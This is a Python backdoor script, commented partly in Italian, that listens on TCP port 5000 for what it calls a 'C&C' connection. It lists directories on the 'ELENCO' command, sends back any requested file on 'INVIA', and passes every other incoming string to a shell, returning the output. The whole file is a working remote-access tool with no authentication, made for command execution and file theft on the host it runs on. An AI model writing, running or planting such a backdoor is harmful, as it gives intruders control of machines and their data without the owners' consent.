import socket
import subprocess
import os

HOST = ''
PORT = 5000

def obtain_dir():
    current_dir = os.getcwd()
    directory_files = os.listdir('.')
    return f"Current directory: {current_dir}\nIn:\n" + "\n".join(directory_files)

def send_file(filename):
    try:
        with open(filename, "rb") as f:
            file_data = f.read()
        # Prepara header con nome file
        header = f"FILENAME:{filename}\n".encode()
        return header + file_data
    except FileNotFoundError:
        return b"Error: file does not exist."

command_map = {
    "ELENCO": obtain_dir,
    "INVIA": send_file
}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()
print("[TARGET] C&C connected.")

while True:
    command = conn.recv(1024).decode().strip()
    if command.upper() == "STOP":
        break

    parts = command.split(maxsplit=1)
    cmd = parts[0].upper()

    if cmd in command_map:
        if cmd == "INVIA" and len(parts) > 1:
            output = command_map[cmd](parts[1]) 
        else:
            output = command_map[cmd]()
        #Encode se è una stringa
        if isinstance(output, str):
            output = output.encode()
    else:
        execute = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = execute.stdout + execute.stderr
        if not output:
            output = "[Command executed, output is none.]"
        output = output.encode()
        
    conn.sendall(output)
    
conn.close()
s.close()



